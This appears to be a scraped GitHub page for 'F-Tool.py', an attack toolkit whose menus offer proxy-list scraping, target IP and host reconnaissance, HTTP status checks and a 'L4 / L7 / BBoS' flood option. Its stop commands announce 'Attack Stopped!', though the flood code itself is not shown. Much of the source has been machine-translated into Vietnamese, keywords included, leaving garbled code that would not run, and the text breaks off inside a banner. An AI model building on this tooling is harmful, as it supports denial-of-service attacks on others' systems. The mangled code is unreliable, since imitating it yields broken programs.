Chuy·ªÉn ƒë·∫øn n·ªôi dung

FDc0d3
/
F-Tool
C√¥ng c·ªông
M√£ s·ªë
V·∫•n ƒë·ªÅ
Y√™u c·∫ßu k√©o
H√†nh ƒë·ªông
D·ª± √°n
Wiki
B·∫£o v·ªá
Th√¥ng tin chi ti·∫øt
 ch√≠nh 
F-Tool/ F-Tool.py

FDc0d3 666
‚Ä¶
 1 ng∆∞·ªùi ƒë√≥ng g√≥p
722 d√≤ng (666 sloc)  30,5 KB
#! / usr / bin / env python3

t·ª´  nh·∫≠p  kh·∫©u t·∫Øt  m√†
t·ª´  ph√¢n t√≠ch c√∫ ph√°p nh·∫≠p urllib  
t·ª´  h·ªá th·ªëng  nh·∫≠p kh·∫©u  h·ªá ƒëi·ªÅu h√†nh
nh·∫≠p  quy tr√¨nh con
nh·∫≠p  ng·∫´u nhi√™n
nh·∫≠p  h·ªá ƒëi·ªÅu h√†nh
nh·∫≠p  h·ªá th·ªëng
 th·ªùi gian nh·∫≠p kh·∫©u
nh·∫≠p  json
 th·ªùi gian nh·∫≠p kh·∫©u
th·ª≠ : # pip3 install httpx request speedtest m√†u s·∫Øc
	ki·ªÉm tra t·ªëc ƒë·ªô nh·∫≠p  kh·∫©u
	nh·∫≠p kh·∫©u  m√†u s·∫Øc
	 y√™u c·∫ßu nh·∫≠p kh·∫©u
	nh·∫≠p  httpx
ngo·∫°i tr·ª´  Exception  as  e :
	sys . tho√°t ra ( e )


l·ªõp  m√†u :
	b·ª©c tranh m√†u . init ( autoreset = True )
	LB  =  m√†u s·∫Øc . Tr∆∞·ªõc . LIGHTBLUE_EX
	LC  =  m√†u s·∫Øc . Tr∆∞·ªõc . LIGHTCYAN_EX
	LG  =  m√†u s·∫Øc . Tr∆∞·ªõc . LIGHTGREEN_EX
	LR  =  m√†u s·∫Øc . Tr∆∞·ªõc . LIGHTRED_EX
	LY  =  phim tr∆∞·ªùng . Tr∆∞·ªõc . LIGHTYELLOW_EX
	ƒê·∫∂T L·∫†I  =  ·∫£nh m√†u . Tr∆∞·ªõc . C√ÄI L·∫†I


L·ªõp h·ªçc  Trang ch·ªß :
	def  __init__ ( b·∫£n th√¢n ,
	gi√∫p ƒë·ª° ,
	dev ):
		b·∫£n th√¢n . help  =  gi√∫p ƒë·ª°
		b·∫£n th√¢n . dev  =  nh√† ph√°t tri·ªÉn

	def  styleText ( self , text ):
		cho  ho·∫°t ·∫£nh  trong  vƒÉn b·∫£n :
			sys . stdout . vi·∫øt ( ho·∫°t h√¨nh )
			sys . stdout . tu√¥n ra ()
			n·∫øu  ho·∫°t ·∫£nh  ! =  "." :
				th·ªùi gian . ng·ªß ( 0,01 )
			kh√°c :
				th·ªùi gian . ng·ªß ( 1 )

	def  home ( self ): # don‚Äôt edit this banner lol
		print ( f "" "
                        { M√†u s·∫Øc . LG } ‚ïî
    { M√†u s·∫Øc . LC } ‚ïîppers { M√†u s·∫Øc . LB } ‚ïî‚ï¶‚ïó‚ïî       M√†u s·∫Øc . LG } ‚ïë { M√†u s·∫Øc . LR } ƒê√£ t·∫°o: { M√†u . LY } 5/3/2022     { M√†u . LG } ‚ïë
    { M√†u s·∫Øc . LC } ‚ï†‚ï£ { M√†u s·∫Øc . LB } { M√†u s·∫Øc . LR } ‚îÄ‚îÄ‚îÄ { M√†u s·∫Øc . LB } ‚ïë ‚ïë ‚ïë‚ïë ‚ïë‚ïë       { M√†u s·∫Øc . LG } ‚ïë { M√†u s·∫Øc . LR } ƒê√£ c·∫≠p nh·∫≠t: { M√†u . LY } 8/3/2022     { M√†u s·∫Øc . LG } ‚ïë
    { M√†u s·∫Øc . LC } ‚ïö { M√†u s·∫Øc . LB }     ‚ï© ‚ïö _ _ LG } v2   { M√†u s·∫Øc . LG } ‚ïë { M√†u s·∫Øc . LB } ƒê∆°n gi·∫£n nh∆∞ng m·∫°nh m·∫Ω XD { M√†u s·∫Øc . LG } ‚ïë
                        { M√†u s·∫Øc . LG } ‚ïöpperspris domains domainsboardsboardsboardsboardsboardsboardsboardsboardsboardsboardsprisoverprisoverprisoverprisoverprisoverpris Internet
    { M√†u s·∫Øc . LR } [ { M√†u . LG } > Made with ‚òï By FDc0d3 & Aya     { Color . LG } < { M√†u s·∫Øc . LR } ] "" ")
		print ( M√†u . LC + "Lo·∫°i" + M√†u . LB + "'HELP'" + M√†u . LC + "ƒë·ªÉ xem t·∫•t c·∫£ c√°c l·ªánh \ n \ n " )
		in ( M√†u . LR + "[" + M√†u . LG + "01" + M√†u . LR + "]" + M√†u . LC + "Proxy" )
		in ( M√†u . LR + "[" + M√†u . LG + "02" + M√†u . LR + "]" + M√†u . LC + "WebTool" )
		in ( M√†u . LR + "[" + M√†u . LG + "03" + M√†u . LR + "]" + M√†u . LC + "L4 / L7 / BBoS" )
		in ( M√†u . LR + "[" + M√†u . LG + "04" + M√†u . LR + "]" + M√†u . LC + "SpeedTest" )
		print ( " \ n " )
		trong khi  ƒê√∫ng :
			th·ª≠ :
				sys . stdout . ghi ( M√†u . LB + "‚ïî + M√†u . LR + " [" + M√†u . LG + " F-Toolv2 " + M√†u . LB + " @ " + M√†u . LG + " Trang ch·ªß " + M√†u . LR + "]" + M√†u s·∫Øc . LB + " \ n ‚ïöpperspris>" + M√†u s·∫Øc . ƒê·∫∂T L·∫†I )
				option  =  input ()
				n·∫øu  t√πy ch·ªçn  ==  '01'  ho·∫∑c  t√πy ch·ªçn  ==  '1' :
					h·ªá ƒëi·ªÅu h√†nh . h·ªá th·ªëng ( 'r√µ r√†ng' )
					D·ª•ng c·ª• . proxy ( t√πy ch·ªçn )
				 t√πy ch·ªçn  elif ==  '02'  ho·∫∑c  t√πy ch·ªçn  ==  '2' :
					h·ªá ƒëi·ªÅu h√†nh . h·ªá th·ªëng ( 'r√µ r√†ng' )
					D·ª•ng c·ª• . webtools ()
				 t√πy ch·ªçn   elif ==  '03'  ho·∫∑c  t√πy ch·ªçn  ==  '3' :
					h·ªá ƒëi·ªÅu h√†nh . h·ªá th·ªëng ( 'r√µ r√†ng' )
					D·ª•ng c·ª• . bbos ()
				 t√πy ch·ªçn  elif ==  '04'  ho·∫∑c  t√πy ch·ªçn  ==  '4' :
					h·ªá ƒëi·ªÅu h√†nh . h·ªá th·ªëng ( 'r√µ r√†ng' )
					D·ª•ng c·ª• . spdtest ()
				elif  option  ==  'ref'  ho·∫∑c  option  ==  'REF' :
					b·∫£n th√¢n . nh√† ()
				elif  option  ==  'home'  ho·∫∑c  option  ==  'HOME' :
					b·∫£n th√¢n . nh√† ()
				elif  option  ==  'clear'  ho·∫∑c  option  ==  'CLEAR' :
					h·ªá ƒëi·ªÅu h√†nh . h·ªá th·ªëng ( 'r√µ r√†ng' )
					F_Tool . nh√† ()
				elif  option  ==  'help'  ho·∫∑c  option  ==  'HELP' :
					in ( t·ª± tr·ª£ gi√∫p )
				elif  option  ==  'dev'  ho·∫∑c  option  ==  'DEV' :
					print ( t·ª± . dev )
				elif  option  ==  'exit'  ho·∫∑c  option  ==  'EXIT' :
					quy tr√¨nh con . run ([ 'pkill -f F-Tool.py' ], shell = True )
				elif  option  ==  'stop'  ho·∫∑c  option  ==  'STOP' :
					quy tr√¨nh con . run ([ 'pkill screen' ], shell = True )
					print ( f " { Color . LG } [!] Attack Stopped!" )
				 t√πy ch·ªçn  elif ==  "" :
					ƒëi qua
				kh√°c :
					print ( M√†u . LR + "l·ªánh:" + M√†u . LG + f " { option } " + M√†u . LR + "kh√¥ng t√¨m th·∫•y" )
			ngo·∫°i tr·ª´  KeyboardInterrupt :
				sys . tho√°t ra ( 0 )


class  response_url :
	def  __init__ ( b·∫£n th√¢n ,
	ti√™u ƒë·ªÅ ):
		b·∫£n th√¢n . headers  =  ti√™u ƒë·ªÅ

	 tra c·ª©u def ( t·ª± , url ):
		th·ª≠ :
			n·∫øu  url  ==  '' :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LG + "[" + M√†u . LR + "!" + M√†u s·∫Øc . LG + "]" + M√†u . LR + "URL kh√¥ng h·ª£p l·ªá"
			resp  =  y√™u c·∫ßu . get ( f "http://ip-api.com/json/ { url } ? fields = status, message, country, countryCode, regionName, city, timezone, asname, isp, org, reverse, query" , headers = self . ti√™u ƒë·ªÅ ). json ()
			info  =  M√†u s·∫Øc . ƒê·ªãa ch·ªâ IP LG + "[+]:" + resp [ 'query' ] + " \ n " + M√†u . LG + "[+] T√™n m√°y ch·ªß:" + resp [ 'ng∆∞·ª£c' ] + " \ n " + M√†u . LG + "[+] ISP:" + resp [ 'isp' ] + " \ n " + M√†u . LG +              "[+] T·ªï ch·ª©c:" +  resp [ 'org' ] +  " \ n "  + M√†u . LG +  "[+] Qu·ªëc gia:"  +  resp [ 'country' ] +  ""  +  "("  +  resp [ 'countryCode' ] +  ")"  +  " \ n "  + M√†u . LG +  "[+] Khu v·ª±c:"  +  resp [ 'regionName'  M√†u s·∫Øc . LG +  "[+] Th√†nh ph·ªë:"  +  resp [ 'city' ] +  " \ n "  + M√†u . LG +  "[+] ASN:"  +  resp [ 'asname' ] +  " \ n "  + M√†u . LG +  "[+] M√∫i gi·ªù:"  +  resp [ 'm√∫i gi·ªù' ]

			if  res [ 'status' ] ==  'th√†nh c√¥ng' :
				tr·∫£ l·∫°i  th√¥ng tin
			else:
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
		except requests.exceptions.ConnectionError:
			return Color.LR+"Error: Check your Internet Connection."

	def ip_lookup(self, ip):
		try:
			if ip == '':
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
			resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,reverse,message,continent,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,as,mobile,proxy,query,asname", headers=self.headers).json()

			info = Color.LG+"    [+] Target IP: " + resp['query'] + "\n" +Color.LG+ "    [+] Country: " + resp['continent'] + " " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['region'] + " " + "(" + resp['regionName'] + ")" + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] Zipcode: " + resp['zip'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone'] + "\n\n" +Color.LG+ "    [+] ISP: " + resp['isp'] + "\n" +Color.LG+ "    [+] ASN: " + resp['as'] + " " + resp['asname'] + "\n\n" +Color.LG+ "    [+] Mobile: " + str(resp['mobile']) + "\n" +Color.LG+ "    [+] VPN: " + str(resp['proxy'])+ "\n\n" +Color.LG+ "    [+] Google Map: https://www.google.com/maps/place/" + str(resp['lat']) + "," + str(resp['lon'])

			if resp['status'] == 'success':
				return info

		except KeyError:
			return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
		except requests.exceptions.ConnectionError:
			tr·∫£ l·∫°i  M√†u s·∫Øc . LR + "L·ªói: Ki·ªÉm tra k·∫øt n·ªëi Internet c·ªßa b·∫°n."

	def  http_status ( t·ª± , url ):
		th·ª≠ :
			parser  =  ph√¢n t√≠ch c√∫ ph√°p . urlparse ( url )
			n·∫øu  ph√¢n t√≠ch c√∫ ph√°p . l∆∞·ª£c ƒë·ªì  ==  "" :
				url  =  "http: //" + url
			resp  =  httpx . get ( url , headers = self . headers )
			tr·∫°ng th√°i  =  resp . status_code
			n·∫øu  tr·∫°ng th√°i  ==  200 :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LG + f "[+] K·∫øt qu·∫£: OK | { round ( resp . Tr√¥i qua . Total_seconds (), 3 ) } Gi√¢y | { status } (OK)"
			 tr·∫°ng th√°i  elif ==  301 :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LG + f "[+] K·∫øt qu·∫£: OK | { round ( t∆∞∆°ng ·ª©ng ƒë√£ tr√¥i qua . Total_seconds ( ), 3 ) } Gi√¢y | { status } (ƒê√£ di chuy·ªÉn vƒ©nh vi·ªÖn)"
			 tr·∫°ng th√°i  elif ==  302 :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LG + f "[+] K·∫øt qu·∫£: OK | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Found)"
			 tr·∫°ng th√°i  elif ==  303 :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LG + f "[+] K·∫øt qu·∫£: OK | { round ( resp . Tr√¥i qua . Total_seconds (), 3 ) } Gi√¢y | { status } (Xem Kh√°c)"
			 tr·∫°ng th√°i  elif ==  307 :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LG + f "[+] K·∫øt qu·∫£: OK | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Temporary Redirect)"
			 tr·∫°ng th√°i  elif ==  400 :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LR + f "[+] K·∫øt qu·∫£: L·ªói m√°y ch·ªß | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Unauthorized)"
			 tr·∫°ng th√°i  elif ==  410 :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LG + f "[+] K·∫øt qu·∫£: OK | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Gone)"
			 tr·∫°ng th√°i  elif ==  401 :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LR + f "[+] K·∫øt qu·∫£: L·ªói m√°y ch·ªß | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Y√™u c·∫ßu kh√¥ng h·ª£p l·ªá)"
			 tr·∫°ng th√°i  elif ==  403 :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LR + f "[+] K·∫øt qu·∫£: L·ªói m√°y ch·ªß | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Forbidden)"
			 tr·∫°ng th√°i  elif ==  404 :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LR + f "[+] K·∫øt qu·∫£: L·ªói m√°y ch·ªß | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Not Found)"
			 tr·∫°ng th√°i  elif ==  429 :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LR + f "[+] K·∫øt qu·∫£: L·ªói m√°y ch·ªß | { round ( resp . Elapsed . Total_seconds (), 3 ) } Gi√¢y | { status } (V·ªõi Nhi·ªÅu Y√™u c·∫ßu)"
			 tr·∫°ng th√°i  elif ==  500 :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LR + f "[+] K·∫øt qu·∫£: L·ªói m√°y ch·ªß | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Internal Server Error)"
			 tr·∫°ng th√°i  elif ==  502 :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LR + f "[+] K·∫øt qu·∫£: L·ªói m√°y ch·ªß | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Bad Gateway)"
			 tr·∫°ng th√°i  elif ==  503 :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LR + f "[+] K·∫øt qu·∫£: L·ªói m√°y ch·ªß | { round ( resp . Elapsed . Total_seconds (), 3 ) } Gi√¢y | { status } (D·ªãch v·ª• Kh√¥ng kh·∫£ d·ª•ng)"
			 tr·∫°ng th√°i  elif ==  504 :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LR + f "[+] K·∫øt qu·∫£: L·ªói m√°y ch·ªß | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Gateway Timeout)"
			 tr·∫°ng th√°i  elif ==  507 :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LR + f "[+] K·∫øt qu·∫£: L·ªói m√°y ch·ªß | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Kh√¥ng ƒë·ªß b·ªô nh·ªõ)"
			 tr·∫°ng th√°i  elif ==  508 :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LR + f "[+] K·∫øt qu·∫£: L·ªói m√°y ch·ªß | { round ( resp . Elapsed . Total_seconds (), 3 ) } Seconds | { status } (Loop Detected)"
			kh√°c :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LR + f "[+] K·∫øt qu·∫£: (H·∫øt th·ªùi gian ch·ªù k·∫øt n·ªëi)"

		ngo·∫°i tr·ª´  httpx . H·∫øt gi·ªù ngo·∫°i l·ªá :
			tr·∫£ l·∫°i  M√†u s·∫Øc . LR + f "[+] K·∫øt qu·∫£: (H·∫øt th·ªùi gian ch·ªù k·∫øt n·ªëi)"
		ngo·∫°i tr·ª´  httpx . ConnectError :
			tr·∫£ l·∫°i  M√†u s·∫Øc . LR + f "[+] K·∫øt qu·∫£: X·∫£y ra l·ªói"
		ngo·∫°i tr·ª´  httpx . Giao th·ª©c kh√¥ng ƒë∆∞·ª£c h·ªó tr·ª£ :
			tr·∫£ l·∫°i  M√†u s·∫Øc . LG + "[" + M√†u . LR + "!" + M√†u s·∫Øc . LG + "]" + M√†u . LR + "URL kh√¥ng h·ª£p l·ªá"

	def  findhost ( self , host ):
		th·ª≠ :
			resp  =  y√™u c·∫ßu . get ( f "https://api.hackertarget.com/hostsearch/?q= { host } " , headers = self . headers )

			info  =  t∆∞∆°ng ·ª©ng . ch·ªØ
			n·∫øu  th√¥ng tin  ==  'l·ªói m√°y ch·ªß kh√¥ng h·ª£p l·ªá' :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LG + "[" + M√†u . LR + "!" + M√†u s·∫Øc . LG + "]" + M√†u . LR + "URL kh√¥ng h·ª£p l·ªá"
			kh√°c :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LG + th√¥ng tin
		ngo·∫°i tr·ª´  c√°c y√™u c·∫ßu . c√°c tr∆∞·ªùng h·ª£p ngo·∫°i l·ªá . L·ªói k·∫øt n·ªëi :
			tr·∫£ l·∫°i  M√†u s·∫Øc . LR + "L·ªói: Ki·ªÉm tra k·∫øt n·ªëi Internet c·ªßa b·∫°n."

	 li√™n k·∫øt gi·∫£i n√©n def ( t·ª± , url ):
		th·ª≠ :
			resp  =  y√™u c·∫ßu . get ( f "https://api.hackertarget.com/pagelinks/?q= { url } " , headers = self . headers )

			info  =  t∆∞∆°ng ·ª©ng . ch·ªØ
			n·∫øu  th√¥ng tin  ==  "url ƒë·∫ßu v√†o kh√¥ng h·ª£p l·ªá" :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LG + "[" + M√†u . LR + "!" + M√†u s·∫Øc . LG + "]" + M√†u . LR + "URL kh√¥ng h·ª£p l·ªá"
			elif  info  ==  "l·ªói l·∫•y li√™n k·∫øt" :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LG + "[" + M√†u . LR + "!" + M√†u s·∫Øc . LG + "]" + M√†u . LR + "Kh√¥ng t√¨m th·∫•y li√™n k·∫øt n√†o!"
			kh√°c :
				tr·∫£ l·∫°i  M√†u s·∫Øc . LG + th√¥ng tin
		ngo·∫°i tr·ª´  c√°c y√™u c·∫ßu . c√°c tr∆∞·ªùng h·ª£p ngo·∫°i l·ªá . L·ªói k·∫øt n·ªëi :
			tr·∫£ l·∫°i  M√†u s·∫Øc . LR + "L·ªói: Ki·ªÉm tra k·∫øt n·ªëi Internet c·ªßa b·∫°n."


 C√¥ng c·ª• l·ªõp h·ªçc :
	def  __init__ ( b·∫£n th√¢n ,
	gi√∫p ƒë·ª° ,
	nh√† ph√°t tri·ªÉn ,
	ti√™u ƒë·ªÅ ):
		b·∫£n th√¢n . help  =  gi√∫p ƒë·ª°
		b·∫£n th√¢n . dev  =  nh√† ph√°t tri·ªÉn
		b·∫£n th√¢n . headers  =  ti√™u ƒë·ªÅ

	 proxy def ( t·ª± , m·ªõi ):
		th·ª≠ :
			v·ªõi  open ( "utils / url.json" , 'r' ) l√†  p :
				read_url  =  p . ƒë·ªçc ()
				readjson  =  json . t·∫£i ( read_url )
		ngo·∫°i tr·ª´  FileNotFoundError :
			sys . exit ( f " { Color . LR } ERROR: { Color . RESET } T·ªáp: 'utils' NotFound" )
		if  new  ==  'ref'  ho·∫∑c  new  ==  'REF'  ho·∫∑c  new  ==  'clear'  ho·∫∑c  new  ==  'CLEAR' :
			h·ªá ƒëi·ªÅu h√†nh . h·ªá th·ªëng ( 'r√µ r√†ng' )
			F_Tool . styleText ( "[*] ƒêang t·∫£i xu·ªëng Proxy M·ªõi ..." )
		kh√°c :
			F_Tool . styleText ( "[*] ƒêang t·∫£i xu·ªëng t·∫•t c·∫£ proxy ..." )
		th·ª≠ :
			http   =  y√™u c·∫ßu . get ( readjson [ 'Proxy' ] [ 0 ] [ 'url' ], headers = self . headers ). ch·ªØ
			http  + =  y√™u c·∫ßu . get ( readjson [ 'Proxy' ] [ 1 ] [ 'url' ], headers = self . headers ). ch·ªØ
			http  + =  y√™u c·∫ßu . get ( readjson [ 'Proxy' ] [ 2 ] [ 'url' ], headers = self . headers ). ch·ªØ
			http  + =  y√™u c·∫ßu . get ( readjson [ 'Proxy' ] [ 3 ] [ 'url' ], headers = self . headers ). ch·ªØ
			https  =  y√™u c·∫ßu . get ( readjson [ 'Proxy' ] [ 4 ] [ 'url' ], headers = self . headers ). ch·ªØ
			https  + =  y√™u c·∫ßu . get ( readjson [ 'Proxy' ] [ 5 ] [ 'url' ], headers = self . headers ). ch·ªØ
			https  + =  y√™u c·∫ßu . get ( readjson [ 'Proxy' ] [ 6 ] [ 'url' ], headers = self . headers ). ch·ªØ
			https  + =   y√™u c·∫ßu . get ( readjson [ 'Proxy' ] [ 7 ] [ 'url' ], headers = self . headers ). ch·ªØ
			v·ªõ4   =  y√™u c·∫ßu . get ( readjson [ 'Proxy' ] [ 8 ] [ 'url' ], headers = self . headers ). ch·ªØ
			v·ªõ4  + =  y√™u c·∫ßu . get ( readjson [ 'Proxy' ] [ 9 ] [ 'url' ], headers = self . headers ). ch·ªØ
			v·ªõ4  + =  y√™u c·∫ßu . get ( readjson [ 'Proxy' ] [ 10 ] [ 'url' ], headers = self . headers ). ch·ªØ
			v·ªõ4  + =  y√™u c·∫ßu . get ( readjson [ 'Proxy' ] [ 11 ] [ 'url' ], headers = self . headers ). ch·ªØ
			v·ªõ5  =  y√™u c·∫ßu . get ( readjson [ 'Proxy' ] [ 12 ] [ 'url' ], headers = self . headers ). ch·ªØ
			v·ªõ5  + =  y√™u c·∫ßu . get ( readjson [ 'Proxy' ] [ 13 ] [ 'url' ], headers = self . headers ). ch·ªØ
			v·ªõ5  + =  y√™u c·∫ßu . get ( readjson [ 'Proxy' ] [ 14 ] [ 'url' ], headers = self . headers ). ch·ªØ
			v·ªõ5  + =  y√™u c·∫ßu . get ( readjson [ 'Proxy' ] [ 15 ] [ 'url' ], headers = self . headers ). ch·ªØ
			h·ªá ƒëi·ªÅu h√†nh . h·ªá th·ªëng ( 'r√µ r√†ng' )
		ngo·∫°i tr·ª´  c√°c y√™u c·∫ßu . c√°c tr∆∞·ªùng h·ª£p ngo·∫°i l·ªá . L·ªói k·∫øt n·ªëi :
			sys . tho√°t ( M√†u . LR + "L·ªói: Ki·ªÉm tra k·∫øt n·ªëi Internet c·ªßa b·∫°n." )

		print ( f "" " { M√†u . LG }
     ___ _
    / _ \ _ __ _____ _ (_) ___ ___
   / / _) / '__ / _ \ \ / / | / _ \ / __ |
  / ___ / | | | (_)> <| | __ / \ __)
  \ / | _ | \ ___ / _ / \ _ \ _ | \ ___ || ___ /
"" " )
		in ( M√†u . LR + "[" + M√†u . LG + "01" + M√†u . LR + "]" + M√†u . LC + "HTTP PROXY" )
		in ( M√†u . LR + "[" + M√†u . LG + "02" + M√†u . LR + "]" + M√†u . LC + "HTTPS PROXY" )
		in ( M√†u . LR + "[" + M√†u . LG + "03" + M√†u . LR + "]" + M√†u . LC + "SOCKS4 PROXY" )
		in ( M√†u . LR + "[" + M√†u . LG + "04" + M√†u . LR + "]" + M√†u . LC + "SOCKS5 PROXY" )
		print ( " \ n " )
		trong khi  ƒê√∫ng :
				sys . stdout . write ( M√†u . LB + "‚ïî ‚ïê +" + M√†u . LR + "[" + M√†u . LG + "F-Toolv2" + M√†u . LB + "@" + M√†u . LG + "Proxy" + M√†u . LR + "]" + M√†u s·∫Øc . LB + " \ n ‚ïöpperspris>" + M√†u s·∫Øc . ƒê·∫∂T L·∫†I )
				option  =  input ()
				n·∫øu  t√πy ch·ªçn  ==  '01'  ho·∫∑c  t√πy ch·ªçn  ==  '1' :
					v·ªõi  open ( "http.txt" , 'w' ) l√†  p :
						p . ghi ( http )
					in ( M√†u . LG + "[+]" + M√†u . LC + "HTTP ƒê√£ l∆∞u v√†o http.txt" )
				 t√πy ch·ªçn  elif ==  '02'  ho·∫∑c  t√πy ch·ªçn  ==  '2' :
					v·ªõi  open ( "https.txt" , 'w' ) l√†  p :
						p . ghi ( https )
					in ( M√†u . LG + "[+]" + M√†u . LC + "HTTPS th√†nh https.txt" )
				 t√πy ch·ªçn  elif ==  '03'  ho·∫∑c  t√πy ch·ªçn  ==  '3' :
					v·ªõi  open ( "v·ªõ4.txt" , 'w' ) l√†  p :
						p . ghi ( v·ªõ4 )
					print ( M√†u . LG + "[+]" + M√†u . LC + "SOCKS4 ƒê√£ l∆∞u v√†o v·ªõ4.txt" )
				 t√πy ch·ªçn  elif ==  '04'  ho·∫∑c  t√πy ch·ªçn  ==  '4' :
					v·ªõi  open ( "v·ªõ5.txt" , 'w' ) l√†  p :
						p . ghi ( v·ªõ5 )
					print(Color.LG+"[+]"+Color.LC+" SOCKS5 Saved to socks5.txt")
				elif option == 'ref' or option == 'REF':
					self.proxy(option)
				elif option == 'home' or option == 'HOME':
					F_Tool.home()
				elif option == 'clear' or option == 'CLEAR':
					os.system('clear')
					self.proxy(option)
				elif option == 'help' or option == 'HELP':
					print(self.help)
				elif option == 'dev' or option == 'DEV':
					print(self.dev)
				elif option == 'exit' or option == 'EXIT':
					subprocess.run(['pkill -f F-Tool.py'], shell=True)
				elif option == 'stop' or option == 'STOP':
					subprocess.run(['pkill screen'], shell=True)
					print(f"{Color.LG} [!] Attack Stopped!")
				elif option == "":
					pass
				else:
					print ( M√†u . LR + "l·ªánh:" + M√†u . LG + f " { option } " + M√†u . LR + "kh√¥ng t√¨m th·∫•y" )

	def  webtools ( t·ª± ):
		print ( f "" " { M√†u . LG }
   __ __ _ _____ _
  / / / \ \ \ ___ | | __ / __ \ ___ ___ | |
  \ \ / \ / / _ \ '_ \ / / \ / _ \ / _ \ | |
   \ / \ / __ / | _) / / | (_) | (_) | |
    \ / \ / \ ___ | _.__ / \ / \ ___ / \ ___ / | _ |
"" " )
		in ( M√†u . LR + "[" + M√†u . LG + "01" + M√†u . LR + "]" + M√†u . LC + "LOOKUP" )
		in ( M√†u . LR + "[" + M√†u . LG + "02" + M√†u . LR + "]" + M√†u . LC + "IP INFO" )
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" HTTP STATUS")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" FIND HOST")
		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" EXTRACT LINK")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"‚ïî‚ïê‚ïê‚ïê"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Webtool"+Color.LR+"]"+Color.LB+"\n‚ïö‚ïê‚ïê> "+Color.RESET)
			option = input()
			if option == '01' or option == '1':
				while True:
					lookup = input(Color.LR+"["+Color.LG+"LOOKUP"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					parser = parse.urlparse(lookup)
					host = parser.netloc
					if parser.scheme == 'https' or parser.scheme == 'http':
						host = parser.netloc
					elif parser.scheme == '':
						url = "http://"+parser.path
						parser = parse.urlparse(url)
						host = parser.netloc
					print(response_url(self.headers).lookup(host))
					break
			elif option == '02' or option == '2':
				while True:
					ip_lookup = input(Color.LR+"["+Color.LG+"IP INFO"+Color.LR+"]"+Color.LC+" Enter Target IP: "+Color.RESET)
					print(response_url(self.headers).ip_lookup(ip_lookup))
					break
			elif option == '03' or option == '3':
				while True:
					http = input(Color.LR+"["+Color.LG+"HTTPCHECK"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					print(response_url(self.headers).http_status(http))
					break
			elif option == '04' or option == '4':
				while True:
					findhost = input(Color.LR+"["+Color.LG+"FINDHOST"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					parser = parse.urlparse(findhost)
					host = parser.netloc
					path = parser.path.replace("/", "")
					if parser.scheme == 'https' or parser.scheme == 'http':
						print(response_url(self.headers).findhost(host))
					elif host == '':
						print(response_url(self.headers).findhost(path))
					break
			elif option == '05' or option == '5':
				while True:
					excractlink = input(Color.LR+"["+Color.LG+"EXCRACTLINK"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					print(response_url(self.headers).extractlink(excractlink))
					break
			elif option == 'ref' or option == 'REF':
				self.webtools()
			elif option == 'home' or option == 'HOME':
				F_Tool.home()
			elif option == 'clear' or option == 'CLEAR':
				os.system('clear')
				self.webtools()
			elif option == 'help' or option == 'HELP':
				print(self.help)
			elif option == 'dev' or option == 'DEV':
				print(self.dev)
			elif option == 'exit' or option == 'EXIT':
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option == 'stop' or option == 'STOP':
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] Attack Stopped!")
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def spdtest(self):
		print(f"""{Color.LG}
   __                     _ _____          _
  / _\_ __   ___  ___  __| /__   \___  ___| |_
  \ \| '_ \ / _ \/ _ \/ _` | / /\/ _ \/ __| __|
